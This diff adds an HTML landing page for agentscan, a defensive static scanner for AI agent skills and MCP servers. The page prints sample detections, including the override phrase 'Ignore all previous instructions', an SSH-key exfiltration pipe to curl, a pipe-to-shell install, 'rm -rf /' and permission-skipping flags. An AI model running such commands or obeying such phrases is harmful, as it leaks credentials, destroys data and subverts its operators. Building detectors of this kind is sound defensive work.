@@ -1,0 +1,356 @@
+<title>agentscan — security scanner for AI agent extensions</title>
+<style>
+  :root {
+    --bg: #f4f6f8;
+    --surface: #ffffff;
+    --surface-2: #eceff3;
+    --text: #191c22;
+    --muted: #586173;
+    --border: #dbdfe6;
+    --accent: #a75f00;
+    --accent-soft: #f0e2cc;
+    --accent-ink: #ffffff;
+    --radius: 12px;
+    --maxw: 1080px;
+    --mono: ui-monospace, "Cascadia Code", "JetBrains Mono", "SF Mono", Menlo, Consolas, monospace;
+    --sans: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    --term-bg: #0a0d12;
+    --term-chrome: #151a22;
+    --term-fg: #c9d1d9;
+    --term-dim: #6e7681;
+    --term-accent: #f5a623;
+    --crit: #ff6b7a;
+    --high: #ff9f5a;
+    --med: #f0c650;
+    --low: #6fb6f2;
+    --pass: #56c596;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0c0f14;
+      --surface: #12161d;
+      --surface-2: #1a1f29;
+      --text: #e7eaef;
+      --muted: #98a1af;
+      --border: #232a35;
+      --accent: #f5a623;
+      --accent-soft: #2a2313;
+      --accent-ink: #140f06;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0c0f14;
+    --surface: #12161d;
+    --surface-2: #1a1f29;
+    --text: #e7eaef;
+    --muted: #98a1af;
+    --border: #232a35;
+    --accent: #f5a623;
+    --accent-soft: #2a2313;
+    --accent-ink: #140f06;
+  }
+
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: var(--maxw); margin: 0 auto; padding: 0 24px; }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 4px; }
+
+  .eyebrow {
+    font-family: var(--mono);
+    font-size: 12px;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin: 0 0 18px;
+  }
+
+  header {
+    position: sticky; top: 0; z-index: 10;
+    background: color-mix(in srgb, var(--bg) 88%, transparent);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border);
+  }
+  .nav { display: flex; align-items: center; justify-content: space-between; height: 60px; }
+  .brand { font-family: var(--mono); font-weight: 700; font-size: 16px; letter-spacing: -0.01em; display: flex; align-items: center; gap: 9px; }
+  .brand .dot { width: 11px; height: 11px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 0 4px var(--accent-soft); }
+  .nav-links { display: flex; align-items: center; gap: 22px; font-family: var(--mono); font-size: 13.5px; }
+  .nav-links a { color: var(--muted); }
+  .nav-links a:hover { color: var(--text); text-decoration: none; }
+  .toggle { background: none; border: 1px solid var(--border); color: var(--muted); font-family: var(--mono); font-size: 12px; padding: 5px 10px; border-radius: 7px; cursor: pointer; }
+  .toggle:hover { color: var(--text); border-color: var(--accent); }
+
+  .hero { display: grid; grid-template-columns: 1.05fr 1.15fr; gap: 48px; align-items: center; padding: 72px 0 64px; }
+  h1 { font-size: clamp(30px, 4.4vw, 46px); line-height: 1.08; letter-spacing: -0.02em; margin: 0 0 20px; text-wrap: balance; }
+  h1 .hl { color: var(--accent); }
+  .lede { font-size: 18px; color: var(--muted); margin: 0 0 28px; max-width: 44ch; }
+  .cta-row { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; }
+  .cmd {
+    display: inline-flex; align-items: center; gap: 12px;
+    font-family: var(--mono); font-size: 15px;
+    background: var(--surface); border: 1px solid var(--border);
+    padding: 12px 14px; border-radius: 10px;
+  }
+  .cmd .prompt { color: var(--accent); }
+  .cmd button { margin-left: 4px; background: var(--accent); color: var(--accent-ink); border: none; font-family: var(--mono); font-size: 12px; font-weight: 700; padding: 6px 10px; border-radius: 6px; cursor: pointer; letter-spacing: 0.04em; }
+  .btn-ghost { font-family: var(--mono); font-size: 13.5px; color: var(--text); border: 1px solid var(--border); padding: 12px 16px; border-radius: 10px; }
+  .btn-ghost:hover { border-color: var(--accent); text-decoration: none; }
+  .badges { margin-top: 22px; display: flex; gap: 18px; flex-wrap: wrap; font-family: var(--mono); font-size: 12.5px; color: var(--muted); }
+  .badges b { color: var(--text); font-weight: 600; }
+
+  .term {
+    background: var(--term-bg);
+    border-radius: 14px;
+    border: 1px solid #222833;
+    box-shadow: 0 30px 60px -30px rgba(0,0,0,0.55), 0 0 0 1px rgba(255,255,255,0.02) inset;
+    overflow: hidden;
+    font-family: var(--mono);
+    position: relative;
+  }
+  .term-bar { display: flex; align-items: center; gap: 8px; padding: 12px 14px; background: var(--term-chrome); border-bottom: 1px solid #222833; }
+  .term-bar .b { width: 11px; height: 11px; border-radius: 50%; }
+  .term-bar .b1 { background: #ff5f57; } .term-bar .b2 { background: #febc2e; } .term-bar .b3 { background: #28c840; }
+  .term-bar .ttl { margin-left: 8px; color: var(--term-dim); font-size: 12px; }
+  .term-body { padding: 16px 18px 20px; font-size: 13px; line-height: 1.62; color: var(--term-fg); overflow-x: auto; }
+  .term-body .row { white-space: pre; }
+  .l { display: block; opacity: 0; transform: translateY(4px); animation: reveal 0.02s ease forwards; }
+  .dim { color: var(--term-dim); }
+  .acc { color: var(--term-accent); }
+  .crit { color: var(--crit); font-weight: 700; }
+  .high { color: var(--high); font-weight: 700; }
+  .med { color: var(--med); font-weight: 700; }
+  .pass { color: var(--pass); font-weight: 700; }
+  .gradeF { color: var(--crit); font-weight: 700; }
+  .scanline { position: absolute; left: 0; right: 0; top: 44px; height: 64px; pointer-events: none;
+    background: linear-gradient(180deg, transparent, color-mix(in srgb, var(--term-accent) 14%, transparent), transparent);
+    animation: sweep 2.4s ease-in-out 0.1s 1 forwards; opacity: 0; }
+  @keyframes reveal { to { opacity: 1; transform: none; } }
+  @keyframes sweep { 0% { opacity: 0; top: 44px; } 15% { opacity: 1; } 85% { opacity: 1; } 100% { opacity: 0; top: 88%; } }
+  .l:nth-child(1){animation-delay:.15s}.l:nth-child(2){animation-delay:.5s}.l:nth-child(3){animation-delay:.62s}
+  .l:nth-child(4){animation-delay:.74s}.l:nth-child(5){animation-delay:.86s}.l:nth-child(6){animation-delay:.98s}
+  .l:nth-child(7){animation-delay:1.1s}.l:nth-child(8){animation-delay:1.22s}.l:nth-child(9){animation-delay:1.34s}
+  .l:nth-child(10){animation-delay:1.46s}.l:nth-child(11){animation-delay:1.58s}.l:nth-child(12){animation-delay:1.7s}
+  .l:nth-child(13){animation-delay:1.82s}.l:nth-child(14){animation-delay:1.94s}.l:nth-child(15){animation-delay:2.06s}
+
+  section { padding: 56px 0; border-top: 1px solid var(--border); }
+  .sec-head { max-width: 60ch; margin-bottom: 34px; }
+  .sec-head h2 { font-size: clamp(22px, 3vw, 30px); letter-spacing: -0.02em; margin: 12px 0 10px; text-wrap: balance; }
+  .sec-head p { color: var(--muted); margin: 0; font-size: 16.5px; }
+
+  .cats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px; }
+  .cat { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 18px 18px 16px; }
+  .cat .top { display: flex; align-items: center; justify-content: space-between; gap: 10px; margin-bottom: 10px; }
+  .cat h3 { font-size: 15.5px; margin: 0; letter-spacing: -0.01em; }
+  .chip { font-family: var(--mono); font-size: 10.5px; font-weight: 700; letter-spacing: 0.06em; padding: 3px 8px; border-radius: 999px; }
+  .chip.c { background: color-mix(in srgb, var(--crit) 16%, transparent); color: var(--crit); }
+  .chip.h { background: color-mix(in srgb, var(--high) 18%, transparent); color: var(--high); }
+  .chip.m { background: color-mix(in srgb, var(--med) 24%, transparent); color: #8a6a0c; }
+  @media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) .chip.m { color: var(--med); } }
+  :root[data-theme="dark"] .chip.m { color: var(--med); }
+  .cat p { margin: 0 0 12px; color: var(--muted); font-size: 14px; }
+  .cat code { display: block; font-family: var(--mono); font-size: 12px; color: var(--text); background: var(--surface-2); border: 1px solid var(--border); border-radius: 7px; padding: 8px 10px; overflow-x: auto; white-space: pre; }
+
+  .band { background: var(--surface-2); border-radius: 16px; padding: 34px 32px; border: 1px solid var(--border); }
+  .band h2 { font-size: clamp(20px, 2.8vw, 27px); margin: 0 0 10px; letter-spacing: -0.02em; text-wrap: balance; }
+  .band p { color: var(--muted); margin: 0; max-width: 66ch; font-size: 16px; }
+
+  .how { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+  .how .item { border-left: 2px solid var(--accent); padding: 4px 0 4px 16px; }
+  .how .item h3 { font-family: var(--mono); font-size: 14px; margin: 0 0 6px; letter-spacing: -0.01em; }
+  .how .item p { margin: 0; color: var(--muted); font-size: 14.5px; }
+
+  pre.code { background: var(--term-bg); color: var(--term-fg); font-family: var(--mono); font-size: 13px; line-height: 1.6; padding: 18px 20px; border-radius: 12px; overflow-x: auto; border: 1px solid #222833; }
+  pre.code .k { color: var(--term-accent); } pre.code .c { color: var(--term-dim); }
+
+  footer { border-top: 1px solid var(--border); padding: 34px 0 60px; color: var(--muted); font-size: 13.5px; }
+  .foot { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 14px; align-items: center; }
+  .foot .links { display: flex; gap: 20px; font-family: var(--mono); }
+  .foot .links a { color: var(--muted); }
+  .note { font-size: 12.5px; color: var(--muted); font-family: var(--mono); margin-top: 8px; }
+
+  @media (max-width: 860px) {
+    .hero { grid-template-columns: 1fr; gap: 34px; padding: 44px 0; }
+    .cats, .how { grid-template-columns: 1fr; }
+    .nav-links .hide-sm { display: none; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    .l { animation: none; opacity: 1; transform: none; }
+    .scanline { display: none; }
+  }
+</style>
+
+<header>
+  <div class="wrap nav">
+    <div class="brand"><span class="dot"></span> agentscan</div>
+    <nav class="nav-links">
+      <a class="hide-sm" href="#catch">What it catches</a>
+      <a class="hide-sm" href="#ci">CI</a>
+      <a href="https://github.com/OWNER/agentscan">GitHub</a>
+      <button class="toggle" id="themeBtn" aria-label="Toggle color theme">theme</button>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <div class="wrap">
+    <section class="hero" style="border-top:none">
+      <div>
+        <p class="eyebrow">Static analysis for the agent era</p>
+        <h1>Know what's inside the <span class="hl">skills</span> you feed your agent.</h1>
+        <p class="lede">A Claude skill, an MCP server, a Cursor rule — you're installing code that runs with your agent's privileges. agentscan reads it first and tells you if it's trying to do something it shouldn't.</p>
+        <div class="cta-row">
+          <span class="cmd"><span class="prompt">$</span> npx agentscan .<button id="copyBtn" data-cmd="npx agentscan .">copy</button></span>
+          <a class="btn-ghost" href="https://github.com/OWNER/agentscan">View on GitHub &rarr;</a>
+        </div>
+        <div class="badges">
+          <span><b>0</b> runtime dependencies</span>
+          <span><b>~30</b> rules &middot; 7 categories</span>
+          <span>runs <b>offline</b> in ms</span>
+        </div>
+      </div>
+
+      <div class="term" role="img" aria-label="Terminal showing agentscan flagging a malicious skill with a failing security score">
+        <div class="term-bar"><span class="b b1"></span><span class="b b2"></span><span class="b b3"></span><span class="ttl">agentscan &mdash; ~/skills/super-helper</span></div>
+        <div class="scanline"></div>
+        <div class="term-body">
+          <div class="row"><span class="l"><span class="dim">$</span> npx agentscan .</span><span class="l">agentscan v0.1.0  <span class="dim">&middot;  2 file(s) scanned in 20ms</span></span><span class="l"> </span><span class="l">  <span class="crit">CRIT</span>  <span class="dim">EX001</span>  Credential read + network send</span><span class="l">        <span class="acc">setup.sh:5</span>  <span class="dim">reads secrets (l.7), sends out (l.5)</span></span><span class="l">  <span class="crit">CRIT</span>  <span class="dim">SE001</span>  AWS access key id  <span class="dim">-&gt; AKIA...MPLE</span></span><span class="l">  <span class="crit">CRIT</span>  <span class="dim">DC001</span>  Destructive delete  <span class="dim">-&gt; rm -rf /</span></span><span class="l">  <span class="high">HIGH</span>  <span class="dim">PI001</span>  Instruction-override phrasing</span><span class="l">        <span class="dim">SKILL.md:8 "Ignore all previous..."</span></span><span class="l">  <span class="high">HIGH</span>  <span class="dim">EX005</span>  Exfil endpoint  <span class="dim">-&gt; webhook.site</span></span><span class="l">  <span class="med">MED </span>  <span class="dim">PI004</span>  Forced tool execution</span><span class="l"> </span><span class="l"><span class="dim">──────────────────────────────────────</span></span><span class="l">  Security score  <span class="gradeF">0/100</span>   grade <span class="gradeF">F</span></span><span class="l">  <span class="gradeF">x</span> 9 finding(s) at/above "high" &mdash; CI fails.</span></div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <div class="wrap">
+    <section id="catch">
+      <div class="sec-head">
+        <p class="eyebrow">What it catches</p>
+        <h2>The patterns a malicious or careless extension leaves behind.</h2>
+        <p>Every finding names the file, line and column, explains the risk, and tells you what to do — secrets are redacted in output.</p>
+      </div>
+      <div class="cats">
+        <div class="cat">
+          <div class="top"><h3>Prompt injection</h3><span class="chip h">HIGH</span></div>
+          <p>Instruction overrides, authority spoofing, &ldquo;don&rsquo;t tell the user&rdquo;, and invisible / bidirectional Unicode that hides text from a human reviewer.</p>
+          <code>Ignore all previous instructions and...</code>
+        </div>
+        <div class="cat">
+          <div class="top"><h3>Data exfiltration</h3><span class="chip c">CRIT</span></div>
+          <p>A file that reads secrets and phones home, plus SSH keys, cloud-cred access and known drop-off endpoints.</p>
+          <code>cat ~/.ssh/id_rsa | curl -X POST ...</code>
+        </div>
+        <div class="cat">
+          <div class="top"><h3>Dangerous commands</h3><span class="chip c">CRIT</span></div>
+          <p>Pipe-to-shell installs, <code style="display:inline;padding:1px 4px">rm -rf /</code>, reverse shells, shell-startup persistence and history wiping.</p>
+          <code>curl -fsSL http://x.sh | bash</code>
+        </div>
+        <div class="cat">
+          <div class="top"><h3>Hardcoded secrets</h3><span class="chip h">HIGH</span></div>
+          <p>AWS keys, private-key blocks, and OpenAI / Anthropic / GitHub / Slack / Stripe / Google tokens committed into a skill.</p>
+          <code>AKIA...  ·  sk-ant-...  ·  ghp_...</code>
+        </div>
+        <div class="cat">
+          <div class="top"><h3>Over-broad permissions</h3><span class="chip h">HIGH</span></div>
+          <p>Wildcard tool grants and <code style="display:inline;padding:1px 4px">--dangerously-skip-permissions</code> / auto-approve flags that remove the human from the loop.</p>
+          <code>"allowedTools": "*"</code>
+        </div>
+        <div class="cat">
+          <div class="top"><h3>Supply chain</h3><span class="chip m">MED</span></div>
+          <p>Auto-confirmed <code style="display:inline;padding:1px 4px">npx -y</code>, runtime package installs and unpinned remote scripts pulled in at run time.</p>
+          <code>npx -y some-unpinned-package</code>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <div class="wrap">
+    <section>
+      <div class="band">
+        <p class="eyebrow">Why it matters</p>
+        <h2>Skills and MCP servers aren&rsquo;t config. They&rsquo;re instructions and code that execute with your agent&rsquo;s privileges.</h2>
+        <p>The ecosystem is exploding and there&rsquo;s no <code style="font-family:var(--mono)">npm audit</code> for it. Drop a community skill into your project and you&rsquo;ve handed it your shell, your files and your tokens. agentscan is the fast static check that reads it before your agent does.</p>
+      </div>
+    </section>
+  </div>
+
+  <div class="wrap">
+    <section>
+      <div class="sec-head">
+        <p class="eyebrow">How it works</p>
+        <h2>Built to be trusted, and to fit where you already work.</h2>
+      </div>
+      <div class="how">
+        <div class="item"><h3>Zero dependencies</h3><p>A security tool shouldn&rsquo;t add supply-chain surface of its own. agentscan ships as a single self-contained CLI.</p></div>
+        <div class="item"><h3>Local &amp; instant</h3><p>Pure static analysis. Nothing you scan ever leaves your machine, and a scan finishes in milliseconds.</p></div>
+        <div class="item"><h3>CI-native</h3><p>Exit codes and <code style="font-family:var(--mono)">--json</code> so you can block a pull request that introduces a risky skill.</p></div>
+      </div>
+    </section>
+  </div>
+
+  <div class="wrap">
+    <section id="ci">
+      <div class="sec-head">
+        <p class="eyebrow">Gate your repo</p>
+        <h2>Fail the build when someone commits a risky extension.</h2>
+      </div>
+      <pre class="code"><span class="c"># .github/workflows/agentscan.yml</span>
+<span class="k">name:</span> agentscan
+<span class="k">on:</span> [push, pull_request]
+<span class="k">jobs:</span>
+  scan:
+    <span class="k">runs-on:</span> ubuntu-latest
+    <span class="k">steps:</span>
+      - <span class="k">uses:</span> actions/checkout@v4
+      - <span class="k">uses:</span> actions/setup-node@v4
+        <span class="k">with:</span> { node-version: 20 }
+      - <span class="k">run:</span> npx agentscan . --fail-on high</pre>
+      <p class="note">exit 0 clean · exit 1 findings at/above --fail-on · exit 2 usage error</p>
+    </section>
+  </div>
+
+  <div class="wrap">
+    <section>
+      <div class="band">
+        <p class="eyebrow">Roadmap</p>
+        <h2>Open-source core, today. More coverage, next.</h2>
+        <p>Coming: obfuscation &amp; entropy checks, MCP tool-poisoning rules, SARIF output, a first-class GitHub Action, and a hosted dashboard for org-wide policy. Rule contributions are very welcome — <a href="https://github.com/OWNER/agentscan">open an issue</a>.</p>
+      </div>
+    </section>
+  </div>
+</main>
+
+<footer>
+  <div class="wrap foot">
+    <div>MIT licensed · built for developers who install AI extensions.</div>
+    <div class="links">
+      <a href="https://github.com/OWNER/agentscan">GitHub</a>
+      <a href="https://www.npmjs.com/package/agentscan">npm</a>
+      <a href="#catch">Docs</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+  (function () {
+    var btn = document.getElementById('themeBtn');
+    var root = document.documentElement;
+    if (btn) btn.addEventListener('click', function () {
+      var cur = root.getAttribute('data-theme');
+      var isDark = cur ? cur === 'dark' : matchMedia('(prefers-color-scheme: dark)').matches;
+      root.setAttribute('data-theme', isDark ? 'light' : 'dark');
+    });
+    var copy = document.getElementById('copyBtn');
+    if (copy) copy.addEventListener('click', function () {
+      var text = copy.getAttribute('data-cmd');
+      if (navigator.clipboard) navigator.clipboard.writeText(text).then(function () {
+        var old = copy.textContent; copy.textContent = 'copied'; setTimeout(function () { copy.textContent = old; }, 1400);
+      });
+    });
+  })();
+</script>
